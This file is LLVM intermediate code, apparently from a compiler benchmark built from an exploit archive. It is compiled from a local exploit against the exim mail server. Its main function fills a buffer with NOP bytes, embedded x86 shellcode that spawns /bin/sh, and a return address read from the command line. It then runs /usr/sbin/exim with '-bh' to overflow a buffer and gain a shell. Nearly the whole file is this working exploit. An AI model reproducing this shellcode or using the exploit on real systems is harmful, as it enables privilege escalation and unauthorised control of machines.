; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_756.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_756.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@main.shellcode = internal global [39 x i8] c"\EB\17^\89v\081\C0\88F\07\89F\0C\B0\0B\89\F3\8DN\081\D2\CD\80\E8\E4\FF\FF\FF/bin/shX\00", align 16
@TAMBUF = common dso_local global i32 0, align 4
@INIC_SH = common dso_local global i32 0, align 4
@NOP = common dso_local global i8 0, align 1
@.str = private unnamed_addr constant [12 x i8] c"RET = 0x%x\0A\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"::%A\00", align 1
@.str.2 = private unnamed_addr constant [15 x i8] c"/usr/sbin/exim\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"./exim\00", align 1
@.str.4 = private unnamed_addr constant [4 x i8] c"-bh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* @TAMBUF, align 4
  %12 = add nsw i32 %11, 1
  %13 = zext i32 %12 to i64
  %14 = call i8* @llvm.stacksave()
  store i8* %14, i8** %6, align 8
  %15 = alloca i8, i64 %13, align 16
  store i64 %13, i64* %7, align 8
  %16 = load i32, i32* @TAMBUF, align 4
  %17 = add nsw i32 %16, 5
  %18 = zext i32 %17 to i64
  %19 = alloca i8, i64 %18, align 16
  store i64 %18, i64* %8, align 8
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call i64 @strtoul(i8* %22, i32* null, i32 16)
  store i64 %23, i64* %10, align 8
  store i32 0, i32* %9, align 4
  br label %24

24:                                               ; preds = %35, %2
  %25 = load i32, i32* %9, align 4
  %26 = load i32, i32* @TAMBUF, align 4
  %27 = sdiv i32 %26, 4
  %28 = icmp slt i32 %25, %27
  br i1 %28, label %29, label %38

29:                                               ; preds = %24
  %30 = load i64, i64* %10, align 8
  %31 = bitcast i8* %15 to i64*
  %32 = load i32, i32* %9, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i64, i64* %31, i64 %33
  store i64 %30, i64* %34, align 8
  br label %35

35:                                               ; preds = %29
  %36 = load i32, i32* %9, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %9, align 4
  br label %24

38:                                               ; preds = %24
  store i32 0, i32* %9, align 4
  br label %39

39:                                               ; preds = %53, %38
  %40 = load i32, i32* %9, align 4
  %41 = call i32 @strlen(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @main.shellcode, i64 0, i64 0))
  %42 = icmp slt i32 %40, %41
  br i1 %42, label %43, label %56

43:                                               ; preds = %39
  %44 = load i32, i32* %9, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [39 x i8], [39 x i8]* @main.shellcode, i64 0, i64 %45
  %47 = load i8, i8* %46, align 1
  %48 = load i32, i32* %9, align 4
  %49 = load i32, i32* @INIC_SH, align 4
  %50 = add nsw i32 %48, %49
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i8, i8* %15, i64 %51
  store i8 %47, i8* %52, align 1
  br label %53

53:                                               ; preds = %43
  %54 = load i32, i32* %9, align 4
  %55 = add nsw i32 %54, 1
  store i32 %55, i32* %9, align 4
  br label %39

56:                                               ; preds = %39
  store i32 0, i32* %9, align 4
  br label %57

57:                                               ; preds = %66, %56
  %58 = load i32, i32* %9, align 4
  %59 = load i32, i32* @INIC_SH, align 4
  %60 = icmp slt i32 %58, %59
  br i1 %60, label %61, label %69

61:                                               ; preds = %57
  %62 = load i8, i8* @NOP, align 1
  %63 = load i32, i32* %9, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds i8, i8* %15, i64 %64
  store i8 %62, i8* %65, align 1
  br label %66

66:                                               ; preds = %61
  %67 = load i32, i32* %9, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %9, align 4
  br label %57

69:                                               ; preds = %57
  %70 = load i32, i32* @TAMBUF, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds i8, i8* %15, i64 %71
  store i8 0, i8* %72, align 1
  %73 = load i64, i64* %10, align 8
  %74 = call i32 @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0), i64 %73)
  %75 = call i32 @strcpy(i8* %19, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %76 = call i32 @strcat(i8* %19, i8* %15)
  %77 = call i32 @execl(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.4, i64 0, i64 0), i8* %19, i8* null)
  %78 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %78)
  %79 = load i32, i32* %3, align 4
  ret i32 %79
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i64 @strtoul(i8*, i32*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @printf(i8*, i64) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
